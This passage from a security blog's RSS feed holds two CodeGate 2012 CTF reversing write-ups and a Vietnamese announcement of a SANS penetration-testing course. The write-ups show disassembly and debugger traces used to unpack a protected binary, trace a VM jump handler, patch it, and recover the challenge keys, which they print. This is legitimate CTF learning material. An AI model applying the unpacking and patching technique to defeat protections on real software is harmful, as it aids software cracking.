    <pre style="font-family: monospace, 'Courier New';background-color: initial;font: normal normal normal 1em/1.2em monospace;margin-top: 0px;margin-bottom: 0px;vertical-align: top;padding: 0px;border: 0px none white"> <span style="color: #0000ff">23</span>     &gt;&gt;  <span style="color: #0000ff">161</span> LOAD_FAST                <span style="color: #0000ff">4</span> <span style="color: #009900;font-weight: bold">(</span>regs<span style="color: #009900;font-weight: bold">)</span>
            <span style="color: #0000ff">164</span> LOAD_CONST               <span style="color: #0000ff">3</span> <span style="color: #009900;font-weight: bold">(</span><span style="color: #7f007f">'EIP'</span><span style="color: #009900;font-weight: bold">)</span>
            <span style="color: #0000ff">167</span> BINARY_SUBSCR
            <span style="color: #0000ff">168</span> LOAD_CONST              <span style="color: #0000ff">15</span> <span style="color: #009900;font-weight: bold">(</span><span style="color: #0000ff">4278021</span><span style="color: #009900;font-weight: bold">)</span>
            <span style="color: #0000ff">171</span> COMPARE_OP               <span style="color: #0000ff">2</span> <span style="color: #009900;font-weight: bold">(</span>==<span style="color: #009900;font-weight: bold">)</span>
            <span style="color: #0000ff">174</span> POP_JUMP_IF_FALSE      <span style="color: #0000ff">276</span></pre>
  </div>
</div>

<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
  If you look at <strong>out.txt</strong> (in attachment) you may also see what&#8217;s read from where as this python script is not complicated, and python byte code is quite easy to understand.
</p>

<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
  So just set EIP to be <strong>413405</strong> and run script, and you will get 1st key. Then set EIP to be <strong>414705</strong> and run scrip again. If you did, everything correct you should see in Log of Immunity Debugger this:
</p>

<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
  <a style="text-decoration: none;color: #0b0080;background-color: initial" href="http://www.xchg.info/wiki/index.php?title=File:Key.png"><img style="vertical-align: middle;margin: 0px;border: initial none initial" src="http://www.xchg.info/wiki/images/5/52/Key.png" alt="Key.png" width="291" height="51" /></a>
</p>

<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
  So final key is <strong>Never_up_N3v3r_1n</strong>
</p>

<h3 style="margin-top: 0px;margin-right: 0px;margin-bottom: 0.3em;margin-left: 0px;padding-top: 0.5em;padding-bottom: 0.17em;border-bottom-width: initial;border-bottom-style: none;border-bottom-color: initial;width: auto;font-size: 17px;font-family: sans-serif">
  <span id="Greetings">Greetings</span>
</h3>

<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
  I would like to say tnx to my <strong>ARTeam</strong> mates, <strong>vnsecurity</strong> guys, and <strong>rd</strong> , and of course to <strong>superkhung</strong> for listening to my random blabing on skype during CTF :)
</p>

<h3 style="margin-top: 0px;margin-right: 0px;margin-bottom: 0.3em;margin-left: 0px;padding-top: 0.5em;padding-bottom: 0.17em;border-bottom-width: initial;border-bottom-style: none;border-bottom-color: initial;width: auto;font-size: 17px;font-family: sans-serif">
  <span id="Author">Author</span>
</h3>

<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
  <strong>deroko of ARTeam</strong>
</p>

<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
  <p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
    <p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
</p></p></p>

  ]]></description>
</item>

	<item>
  <title>CodeGate 2012 Quals bin400 writeup</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2012/02/28/codegate-2012-quals-bin400-writeup.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2012-02-28T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2012/02/28/codegate-2012-quals-bin400-writeup.html</guid>
  <description><![CDATA[
     <p><span style="color: #222222;font-family: 'Lucida Grande', Arial, Tahoma, Verdana, sans-serif;font-size: 13px;line-height: 18px">Thanks to Deroko and some ARTeam members to play with CLGT. Below is the write up by Deroko posted on <a href="http://www.xchg.info/wiki/index.php?title=CodeGate2012_bin400">http://www.xchg.info/wiki/index.php?title=CodeGate2012_bin400</a></span></p>

<h3 style="margin-top: 0px;margin-right: 0px;margin-bottom: 0.3em;margin-left: 0px;padding-top: 0.5em;padding-bottom: 0.17em;border-bottom-width: initial;border-bottom-style: none;border-bottom-color: initial;width: auto;font-size: 17px;font-family: sans-serif">
  <span id="CodeGate2012_bin400">CodeGate2012 bin400</span>
</h3>

<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
  Challenge: <strong>The Rewolf in Kaspersky </strong><br /> Link to challenge : <a rel="nofollow" href="http://deroko.phearless.org/codegate2012/bin/bin400.zip">http://deroko.phearless.org/codegate2012/bin/bin400.zip</a>
</p>

<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
  So Rewolf vm, is packed with something called <strong>KasperSky</strong> according to<strong>ProtectionID</strong> (never heard of this packer ). Unpacking is trivial, like with any simple packer. Run to OEP, dump, fix imports:
</p>

<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
  Here is OEP for ReWolf VM:
</p>

<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
  <a style="text-decoration: none;color: #0b0080;background-color: initial" href="http://www.xchg.info/wiki/index.php?title=File:Rewolf_oep.png"><img style="vertical-align: middle;margin: 0px;border: initial none initial" src="http://www.xchg.info/wiki/images/6/6d/Rewolf_oep.png" alt="Rewolf oep.png" width="398" height="198" /></a>
</p>

<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
  And here is OEP for original program (note you need to dump at ReWolf VM, but importrec will work only properly if you use this OEP) :
</p>

<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
  <a style="text-decoration: none;color: #0b0080;background-color: initial" href="http://www.xchg.info/wiki/index.php?title=File:Real_oep.png"><img style="vertical-align: middle;margin: 0px;border: initial none initial" src="http://www.xchg.info/wiki/images/b/b9/Real_oep.png" alt="Real oep.png" width="398" height="225" /></a>
</p>

<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
  Once we have file dumped, we might run it to get idea how it actually looks like:
</p>

<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
  <a style="text-decoration: none;color: #0b0080;background-color: initial" href="http://www.xchg.info/wiki/index.php?title=File:Appwindow.png"><img style="vertical-align: middle;margin: 0px;border: initial none initial" src="http://www.xchg.info/wiki/images/6/6c/Appwindow.png" alt="Appwindow.png" width="266" height="82" /></a>
</p>

<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
  Not much there :( 1st time I pressed some key while program was focused I got an exception:
</p>

<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
  <a style="text-decoration: none;color: #0b0080;background-color: initial" href="http://www.xchg.info/wiki/index.php?title=File:Exception.png"><img style="vertical-align: middle;margin: 0px;border: initial none initial" src="http://www.xchg.info/wiki/images/4/44/Exception.png" alt="Exception.png" width="944" height="115" /></a><br /> <a style="text-decoration: none;color: #0b0080;background-color: initial" href="http://www.xchg.info/wiki/index.php?title=File:Exception_code.png"><img style="vertical-align: middle;margin: 0px;border: initial none initial" src="http://www.xchg.info/wiki/images/c/c6/Exception_code.png" alt="Exception code.png" width="497" height="23" /></a>
</p>

<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
  At first I thought that my dump is broken, so I tried with original application, same thing happened. Hmmm so this is common problem, but challenge is definitely not broken, so we need to see what&#8217;s going on, and trace instruction per instruction in ReWolf VM.
</p>

<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
  After a little bit of tracing I noticed that exception comes after virtualized jcc is executed, because next instruction size is wrong. (From exception you can see that<strong>ecx</strong> is quite big number which it should not be):
</p>

<div style="font-family: sans-serif;font-size: 13px;text-align: left" dir="ltr">
  <div style="line-height: normal;font-family: monospace">
    <pre style="font-family: monospace, 'Courier New';background-color: initial;font: normal normal normal 1em/1.2em monospace;margin-top: 0px;margin-bottom: 0px;vertical-align: top;padding: 0px;border: 0px none white"><span style="color: #adadad;font-style: italic">0041D000</span>   <span style="color: #0000ff">50</span>               <span style="color: #00007f;font-weight: bold">PUSH</span> <span style="color: #00007f">EAX</span>            &lt;<span style="color: #339933">-----</span> start of jcc opcode
<span style="color: #adadad;font-style: italic">0041D001</span>   9C               <span style="color: #00007f;font-weight: bold">PUSHFD</span>
<span style="color: #adadad;font-style: italic">0041D002</span>   <span style="color: #0000ff">58</span>               <span style="color: #00007f;font-weight: bold">POP</span> <span style="color: #00007f">EAX</span>
<span style="color: #adadad;font-style: italic">0041D003</span>   <span style="color: #0000ff">53</span>               <span style="color: #00007f;font-weight: bold">PUSH</span> <span style="color: #00007f">EBX</span>
<span style="color: #adadad;font-style: italic">0041D004</span>   E8 <span style="color: #0000ff">00000000</span>      <span style="color: #00007f;font-weight: bold">CALL</span> <span style="color: #00007f;font-weight: bold">test</span><span style="color: #339933">.</span>0041D009
<span style="color: #adadad;font-style: italic">0041D009</span>   5B               <span style="color: #00007f;font-weight: bold">POP</span> <span style="color: #00007f">EBX</span>
<span style="color: #adadad;font-style: italic">0041D00A</span>   8D5453 <span style="color: #0000ff">08</span>        <span style="color: #00007f;font-weight: bold">LEA</span> <span style="color: #00007f">EDX</span><span style="color: #339933">,</span><span style="font-weight: bold">DWORD</span> <span style="font-weight: bold">PTR</span> <span style="color: #00007f">DS</span><span style="color: #339933">:</span><span style="color: #009900;font-weight: bold">[</span><span style="color: #00007f">EBX</span><span style="color: #339933">+</span><span style="color: #00007f">EDX</span><span style="color: #339933">*</span><span style="color: #0000ff">2</span><span style="color: #339933">+</span><span style="color: #0000ff">8</span><span style="color: #009900;font-weight: bold">]</span>
<span style="color: #adadad;font-style: italic">0041D00E</span>   5B               <span style="color: #00007f;font-weight: bold">POP</span> <span style="color: #00007f">EBX</span>
<span style="color: #adadad;font-style: italic">0041D00F</span>   FFE2             <span style="color: #00007f;font-weight: bold">JMP</span> <span style="color: #00007f">EDX</span></pre>
  </div>
</div>

<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
  If jcc is taked <strong>edx</strong> is set to 1, otherwise <strong>edx</strong> is 0.
</p>

<div style="font-family: sans-serif;font-size: 13px;text-align: left" dir="ltr">
  <div style="line-height: normal;font-family: monospace">
    <pre style="font-family: monospace, 'Courier New';background-color: initial;font: normal normal normal 1em/1.2em monospace;margin-top: 0px;margin-bottom: 0px;vertical-align: top;padding: 0px;border: 0px none white"><span style="color: #adadad;font-style: italic">0041D0DE</span>   33D2             <span style="color: #00007f;font-weight: bold">XOR</span> <span style="color: #00007f">EDX</span><span style="color: #339933">,</span><span style="color: #00007f">EDX</span>                              <span style="color: #666666;font-style: italic">; test.0041D023</span>
<span style="color: #adadad;font-style: italic">0041D0E0</span>   EB <span style="color: #0000ff">04</span>            <span style="color: #00007f;font-weight: bold">JMP</span> <span style="font-weight: bold">SHORT</span> <span style="color: #00007f;font-weight: bold">test</span><span style="color: #339933">.</span>0041D0E6
<span style="color: #adadad;font-style: italic">0041D0E2</span>   33D2             <span style="color: #00007f;font-weight: bold">XOR</span> <span style="color: #00007f">EDX</span><span style="color: #339933">,</span><span style="color: #00007f">EDX</span>
<span style="color: #adadad;font-style: italic">0041D0E4</span>   EB <span style="color: #0000ff">01</span>            <span style="color: #00007f;font-weight: bold">JMP</span> <span style="font-weight: bold">SHORT</span> <span style="color: #00007f;font-weight: bold">test</span><span style="color: #339933">.</span>0041D0E7
<span style="color: #adadad;font-style: italic">0041D0E6</span>   <span style="color: #0000ff">42</span>               <span style="color: #00007f;font-weight: bold">INC</span> <span style="color: #00007f">EDX</span>
<span style="color: #adadad;font-style: italic">0041D0E7</span>   <span style="color: #0000ff">50</span>               <span style="color: #00007f;font-weight: bold">PUSH</span> <span style="color: #00007f">EAX</span>
<span style="color: #adadad;font-style: italic">0041D0E8</span>   9D               <span style="color: #00007f;font-weight: bold">POPFD</span>
<span style="color: #adadad;font-style: italic">0041D0E9</span>   <span style="color: #0000ff">58</span>               <span style="color: #00007f;font-weight: bold">POP</span> <span style="color: #00007f">EAX</span></pre>
  </div>
</div>

<div style="font-family: sans-serif;font-size: 13px;text-align: left" dir="ltr">
  <div style="line-height: normal;font-family: monospace">
    <pre style="font-family: monospace, 'Courier New';background-color: initial;font: normal normal normal 1em/1.2em monospace;margin-top: 0px;margin-bottom: 0px;vertical-align: top;padding: 0px;border: 0px none white"><span style="color: #adadad;font-style: italic">0041D4AA</span>   5A               <span style="color: #00007f;font-weight: bold">POP</span> <span style="color: #00007f">EDX</span>                &lt;<span style="color: #339933">----</span> <span style="color: #00007f;font-weight: bold">pop</span> EIP <span style="color: #009900;font-weight: bold">(</span>jcc <span style="color: #00007f;font-weight: bold">not</span> taken<span style="color: #009900;font-weight: bold">)</span>
<span style="color: #adadad;font-style: italic">0041D4AB</span>   <span style="color: #0000ff">58</span>               <span style="color: #00007f;font-weight: bold">POP</span> <span style="color: #00007f">EAX</span>
<span style="color: #adadad;font-style: italic">0041D4AC</span>  ^E9 2CFFFFFF      <span style="color: #00007f;font-weight: bold">JMP</span> <span style="color: #00007f;font-weight: bold">test</span><span style="color: #339933">.</span>0041D3DD
<span style="color: #adadad;font-style: italic">0041D4B1</span>   0FB657 <span style="color: #0000ff">03</span>        <span style="color: #00007f;font-weight: bold">MOVZX</span> <span style="color: #00007f">EDX</span><span style="color: #339933">,</span><span style="font-weight: bold">BYTE</span> <span style="font-weight: bold">PTR</span> <span style="color: #00007f">DS</span><span style="color: #339933">:</span><span style="color: #009900;font-weight: bold">[</span><span style="color: #00007f">EDI</span><span style="color: #339933">+</span><span style="color: #0000ff">3</span><span style="color: #009900;font-weight: bold">]</span>
<span style="color: #adadad;font-style: italic">0041D4B5</span>   FF7424 <span style="color: #0000ff">08</span>        <span style="color: #00007f;font-weight: bold">PUSH</span> <span style="font-weight: bold">DWORD</span> <span style="font-weight: bold">PTR</span> <span style="color: #00007f">SS</span><span style="color: #339933">:</span><span style="color: #009900;font-weight: bold">[</span><span style="color: #00007f">ESP</span><span style="color: #339933">+</span><span style="color: #0000ff">8</span><span style="color: #009900;font-weight: bold">]</span>
<span style="color: #adadad;font-style: italic">0041D4B9</span>   9D               <span style="color: #00007f;font-weight: bold">POPFD</span>
<span style="color: #adadad;font-style: italic">0041D4BA</span>   E8 41FBFFFF      <span style="color: #00007f;font-weight: bold">CALL</span> <span style="color: #00007f;font-weight: bold">test</span><span style="color: #339933">.</span>0041D000
<span style="color: #adadad;font-style: italic">0041D4BF</span>   85D2             <span style="color: #00007f;font-weight: bold">TEST</span> <span style="color: #00007f">EDX</span><span style="color: #339933">,</span><span style="color: #00007f">EDX</span>
<span style="color: #adadad;font-style: italic">0041D4C1</span>  ^<span style="color: #0000ff">74</span> E7            <span style="color: #00007f;font-weight: bold">JE</span> <span style="font-weight: bold">SHORT</span> <span style="color: #00007f;font-weight: bold">test</span><span style="color: #339933">.</span>0041D4AA
<span style="color: #adadad;font-style: italic">0041D4C3</span>   5A               <span style="color: #00007f;font-weight: bold">POP</span> <span style="color: #00007f">EDX</span>
<span style="color: #adadad;font-style: italic">0041D4C4</span>   <span style="color: #0000ff">0357</span> <span style="color: #0000ff">04</span>          <span style="color: #00007f;font-weight: bold">ADD</span> <span style="color: #00007f">EDX</span><span style="color: #339933">,</span><span style="font-weight: bold">DWORD</span> <span style="font-weight: bold">PTR</span> <span style="color: #00007f">DS</span><span style="color: #339933">:</span><span style="color: #009900;font-weight: bold">[</span><span style="color: #00007f">EDI</span><span style="color: #339933">+</span><span style="color: #0000ff">4</span><span style="color: #009900;font-weight: bold">]</span> &lt;<span style="color: #339933">---</span> increment EIP <span style="color: #009900;font-weight: bold">(</span>jcc taken<span style="color: #009900;font-weight: bold">)</span>
<span style="color: #adadad;font-style: italic">0041D4C7</span>   <span style="color: #0000ff">034F</span> <span style="color: #0000ff">04</span>          <span style="color: #00007f;font-weight: bold">ADD</span> <span style="color: #00007f">ECX</span><span style="color: #339933">,</span><span style="font-weight: bold">DWORD</span> <span style="font-weight: bold">PTR</span> <span style="color: #00007f">DS</span><span style="color: #339933">:</span><span style="color: #009900;font-weight: bold">[</span><span style="color: #00007f">EDI</span><span style="color: #339933">+</span><span style="color: #0000ff">4</span><span style="color: #009900;font-weight: bold">]</span>
<span style="color: #adadad;font-style: italic">0041D4CA</span>   <span style="color: #0000ff">58</span>               <span style="color: #00007f;font-weight: bold">POP</span> <span style="color: #00007f">EAX</span>
<span style="color: #adadad;font-style: italic">0041D4CB</span>  ^E9 5AFEFFFF      <span style="color: #00007f;font-weight: bold">JMP</span> <span style="color: #00007f;font-weight: bold">test</span><span style="color: #339933">.</span>0041D32A</pre>
  </div>
</div>

<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
  <strong>[edi+4] = 00000104</strong>
</p>

<div style="font-family: sans-serif;font-size: 13px;text-align: left" dir="ltr">
  <div style="line-height: normal;font-family: monospace">
    <pre style="font-family: monospace, 'Courier New';background-color: initial;font: normal normal normal 1em/1.2em monospace;margin-top: 0px;margin-bottom: 0px;vertical-align: top;padding: 0px;border: 0px none white"><span style="color: #adadad;font-style: italic">0041D32A</span>   8BF2             <span style="color: #00007f;font-weight: bold">MOV</span> <span style="color: #00007f">ESI</span><span style="color: #339933">,</span><span style="color: #00007f">EDX</span>
<span style="color: #adadad;font-style: italic">0041D32C</span>   <span style="color: #0000ff">46</span>               <span style="color: #00007f;font-weight: bold">INC</span> <span style="color: #00007f">ESI</span>
<span style="color: #adadad;font-style: italic">0041D32D</span>   8A02             <span style="color: #00007f;font-weight: bold">MOV</span> <span style="color: #00007f">AL</span><span style="color: #339933">,</span><span style="font-weight: bold">BYTE</span> <span style="font-weight: bold">PTR</span> <span style="color: #00007f">DS</span><span style="color: #339933">:</span><span style="color: #009900;font-weight: bold">[</span><span style="color: #00007f">EDX</span><span style="color: #009900;font-weight: bold">]</span>           &lt;<span style="color: #339933">---</span> <span style="font-weight: bold">size</span> of next instruction
<span style="color: #adadad;font-style: italic">0041D32F</span>   <span style="color: #0000ff">3242</span> <span style="color: #0000ff">01</span>          <span style="color: #00007f;font-weight: bold">XOR</span> <span style="color: #00007f">AL</span><span style="color: #339933">,</span><span style="font-weight: bold">BYTE</span> <span style="font-weight: bold">PTR</span> <span style="color: #00007f">DS</span><span style="color: #339933">:</span><span style="color: #009900;font-weight: bold">[</span><span style="color: #00007f">EDX</span><span style="color: #339933">+</span><span style="color: #0000ff">1</span><span style="color: #009900;font-weight: bold">]</span>         &lt;<span style="color: #339933">---</span> <span style="color: #00007f;font-weight: bold">xor</span> 1st <span style="color: #0000ff">2</span> bytes to get proper sie
<span style="color: #adadad;font-style: italic">0041D332</span>   0FB6C0           <span style="color: #00007f;font-weight: bold">MOVZX</span> <span style="color: #00007f">EAX</span><span style="color: #339933">,</span><span style="color: #00007f">AL</span>
<span style="color: #adadad;font-style: italic">0041D335</span>   <span style="color: #0000ff">50</span>               <span style="color: #00007f;font-weight: bold">PUSH</span> <span style="color: #00007f">EAX</span>                           &lt;<span style="color: #339933">---</span> <span style="font-weight: bold">size</span> of instruction passed to memcpy
<span style="color: #adadad;font-style: italic">0041D336</span>   <span style="color: #0000ff">56</span>               <span style="color: #00007f;font-weight: bold">PUSH</span> <span style="color: #00007f">ESI</span>
<span style="color: #adadad;font-style: italic">0041D337</span>   <span style="color: #0000ff">57</span>               <span style="color: #00007f;font-weight: bold">PUSH</span> <span style="color: #00007f">EDI</span>
<span style="color: #adadad;font-style: italic">0041D338</span>   E8 D8050000      <span style="color: #00007f;font-weight: bold">CALL</span> <span style="color: #00007f;font-weight: bold">test</span><span style="color: #339933">.</span>0041D915                 &lt;<span style="color: #339933">---</span> memcpy</pre>
  </div>
</div>

<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
  <strong>BOOM Exception</strong>
</p>

<div style="font-family: sans-serif;font-size: 13px;text-align: left" dir="ltr">
  <div style="line-height: normal;font-family: monospace">
    <pre style="font-family: monospace, 'Courier New';background-color: initial;font: normal normal normal 1em/1.2em monospace;margin-top: 0px;margin-bottom: 0px;vertical-align: top;padding: 0px;border: 0px none white"><span style="color: #adadad;font-style: italic">0041DB10</span>  <span style="color: #0000ff">25</span> <span style="color: #0000ff">93</span> <span style="color: #0000ff">97</span> B6 C4 C5 <span style="color: #0000ff">89</span> 8A                          <span style="color: #339933">%</span>“—¶ÄÅ‰Š</pre>
  </div>
</div>

<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
  Instruction size is calculated as <strong>25 ^ 93 = B6</strong> which is wrong for instruction size in this case.
</p>

<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
  At this point I decided to try and patch jcc vm handler so jcc will not be taken:
</p>

<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
  <a style="text-decoration: none;color: #0b0080;background-color: initial" href="http://www.xchg.info/wiki/index.php?title=File:Patch.png"><img style="vertical-align: middle;margin: 0px;border: initial none initial" src="http://www.xchg.info/wiki/images/6/63/Patch.png" alt="Patch.png" width="399" height="189" /></a>
</p>

<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
  and then I typed something:
</p>

<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
  <a style="text-decoration: none;color: #0b0080;background-color: initial" href="http://www.xchg.info/wiki/index.php?title=File:Firstcharacter.png"><img style="vertical-align: middle;margin: 0px;border: initial none initial" src="http://www.xchg.info/wiki/images/7/7c/Firstcharacter.png" alt="Firstcharacter.png" width="270" height="81" /></a>
</p>

<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
  And then I just kept pressing keys:
</p>

<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
  <a style="text-decoration: none;color: #0b0080;background-color: initial" href="http://www.xchg.info/wiki/index.php?title=File:Okunlocked.png"><img style="vertical-align: middle;margin: 0px;border: initial none initial" src="http://www.xchg.info/wiki/images/8/85/Okunlocked.png" alt="Okunlocked.png" width="270" height="83" /></a>
</p>

<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
  Press <strong>OK</strong> and you get the key:
</p>

<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
  <a style="text-decoration: none;color: #0b0080;background-color: initial" href="http://www.xchg.info/wiki/index.php?title=File:Finalkey.png"><img style="vertical-align: middle;margin: 0px;border: initial none initial" src="http://www.xchg.info/wiki/images/2/21/Finalkey.png" alt="Finalkey.png" width="269" height="83" /></a>
</p>

<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
  So correct key for bin400 is : <strong>WonderFul_lollol_!</strong>
</p>

<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
  <h3 style="margin-top: 0px;margin-right: 0px;margin-bottom: 0.3em;margin-left: 0px;padding-top: 0.5em;padding-bottom: 0.17em;border-bottom-width: initial;border-bottom-style: none;border-bottom-color: initial;width: auto;font-size: 17px;font-family: sans-serif">
    <span id="Greetings">Greetings</span>
  </h3>
  
  <p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
    I would like to say tnx to my <strong>ARTeam</strong> mates, <strong>vnsecurity</strong> guys, and of course<strong>superkhung</strong> for listening to my random blabing on skype during CTF :)
  </p>
  
  <h3 style="margin-top: 0px;margin-right: 0px;margin-bottom: 0.3em;margin-left: 0px;padding-top: 0.5em;padding-bottom: 0.17em;border-bottom-width: initial;border-bottom-style: none;border-bottom-color: initial;width: auto;font-size: 17px;font-family: sans-serif">
    <span id="Author">Author</span>
  </h3>
  
  <p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
    <strong>deroko of ARTeam</strong>
  </p>
  
  <div>
    <strong><br /> </strong>
  </div>
</p>

  ]]></description>
</item>

	<item>
  <title>Học viện SANS đến Việt Nam 03/2012</title>
  <link>http://realjenius.com/headlines/2011/12/20/hoc-vien-sans-den-viet-nam.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2011-12-20T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/headlines/2011/12/20/hoc-vien-sans-den-viet-nam.html</guid>
  <description><![CDATA[
     <p style="text-align: justify">
  Những ai làm về lĩnh vực an toàn thông tin chắc đều biết đến <a href="http://www.sans.org" target="_blank">học viện SANS</a> như là một học viện hàng đầu thế giới về đào tạo an toàn thông tin. Học viện SANS, được thành lập từ năm 1989, đã đào tạo hơn 165,000 chuyên gia an toàn thông tin khắp nơi trên thế giới trong đó có những nhà quản lý an toàn thông tin cao cấp, chuyên gia đánh giá an ninh hay các quản trị viên hệ thống cho các tập đoàn hàng đầu thế giới hay các cơ quan an ninh chính phủ. Học viện SANS còn có một hệ thống tài liệu nghiên cứu khổng lồ về an toàn thông tin và điều hành trung tâm cảnh báo an ninh Internet.
</p>

<p style="text-align: justify">
  <img class="aligncenter" src="http://force.vnsecurity.net/sans-vn.png" alt="" width="479" height="209" />
</p>

<p style="text-align: justify">
  Các chứng chỉ an toàn thông tin của học viện SANS được công nhận trên toàn thế giới và luôn được đánh giá là chứng chỉ hàng đầu về an toàn thông tin. Thông thường các khóa học của học viện SANS hàng năm diễn ra ở Mỹ, Châu Âu và một vài nước Châu Á. Việc học và thi chứng chỉ của SANS nói riêng hay các chứng chỉ quốc tế khác thường mất khá nhiều thời gian và tốn kém tại Việt nam. Như một bước khởi đầu cho việc đào tạo an toàn thông tin ở Việt nam, học viện SANS lần đầu tiên mở một khóa học <a href="https://www.sans.org/security-training/network-penetration-testing-ethical-hacking-937-mid" target="_blank">SANS 560</a> về Kiểm Định An Toàn Thông Tin Mạng (“Network Penetration Testing and Ethical Hacking”) vào đầu năm 2012 tại thành phố Hồ Chí Minh.
</p>

<p>Học viên sẽ được tổ chức thi chứng chỉ <a href="http://www.giac.org/certification/penetration-tester-gpen" target="_blank">GIAC Penetration Tester</a> (GIAC GPEN) tại chỗ. Đây là chứng chỉ uy tín nhất hiện nay dành cho chuyên gia an toàn thông tin trong việc kiểm định an toàn thông tin mạng.</p>

<blockquote>
  <address>
  Thời gian: Tháng 03, 2012<br /> Địa điểm: The Fleminton Tower<br /> 182 Lê Đại Hành, Quận 11<br /> Thành phố Hồ Chí Minh, Việt nam
</address>
</blockquote>

<p>Để đăng kí khóa học, xin vui lòng truy cập vào <a href="http://www.sans.org/mentor/details.php?nid=27046">http://www.sans.org/mentor/details.php?nid=27046</a>. SANS hiện có chương trình giảm giá cho các công ty, tổ chức về an toàn thông tin tại Việt nam cũng như các công ty đăng ký từ 02 học viên trở lên. Để có được mã giảm giá, xin vui lòng email thanh _AT_ vnsecurity.net  trước khi đăng ký.</p>

<p>Thông tin chi tiết hơn về khóa học có thể xem ở <a href="http://force.vnsecurity.net/download/SANS-560-VN.pdf" target="_self">đây</a>.</p>

<p>**Thông tin tham khảo:<br />
**</p>

<ol>
  <li><a href="http://force.vnsecurity.net/download/SANS-560-VN.pdf" target="_blank">http://force.vnsecurity.net/download/SANS-560-VN.pdf</a></li>
  <li><a href="https://www.sans.org/security-training/network-penetration-testing-ethical-hacking-937-mid" target="_blank">https://www.sans.org/security-training/network-penetration-testing-ethical-hacking-937-mid</a></li>
  <li><a href="http://www.giac.org/certification/penetration-tester-gpen" target="_blank">http://www.giac.org/certification/penetration-tester-gpen</a></li>
  <li><a href="http://www.sans.org/mentor/details.php?nid=27046" target="_blank">http://www.sans.org/mentor/details.php?nid=27046</a></li>
</ol>

  ]]></description>
</item>

</channel>
</rss>